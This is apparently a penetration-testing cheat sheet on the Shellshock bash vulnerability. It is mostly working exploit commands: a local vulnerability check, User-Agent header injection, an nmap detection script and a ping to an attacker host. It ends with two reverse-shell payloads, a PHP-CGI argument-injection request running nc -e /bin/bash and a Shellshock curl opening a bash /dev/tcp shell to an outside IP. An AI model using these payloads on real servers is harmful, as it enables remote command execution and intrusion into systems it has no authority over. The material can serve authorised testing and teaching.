It is a backdoor that affected CGI programs on web servers, OpenSSH, DHCP Clients...

When executed on a system, the shell would echo `vuln` if it's vulnerable to shellsock:

```sh
env x=`() { :;}; echo vuln` bash -c "echo this is a test"
```


Attack vectors
Modification of `User-Agent` strings to include shellshock payloads inteded to run command on the remote server

```sh
curl -H "user-agent: () { :; }; <command>
```

## Exploitation
Locate CGI program on a potentiallt vulnerable systeme
The `phpinfo.php` page can give use some information about the cgi location the variables like

- `ORIG_SCRIPT_NAME`
- `_ENV["ORIG_SCRIPT_NAME"]`
- `_SERVER["ORIG_SCRIPT_NAME"]`

```sh
nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi <target> -p 80
```

```sh
curl -H "user-agent: () { :; }; ping -c 5 -p uniq_string attacker.machine
```

---
Reverse-shelll 

```sh
curl -i -s -k -X 'POST' --data-binary "<?php system('nc 192.168.45.128 4444 -e /bin/bash');die; ?>" "http://target.com/cgi-bin/php5?%2dd+allow_url_include%3don+%2dd+safe_mode%3doff+%2dd+suhosin%2esimulation%3don+%2dd+disable_functions%3d%22%22+%2dd+open_basedir%3dnone+%2dd+auto_prepend_file%3dphp%3a%2f%2finput+%2dd+cgi%2eforce_redirect%3d0+%2dd+cgi%2eredirect_status_env%3d0+%2dn"
```


```sh
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.2.113.150/9001 0>&1'" \
http://10.10.111.109/cgi-bin/test.cgi
```

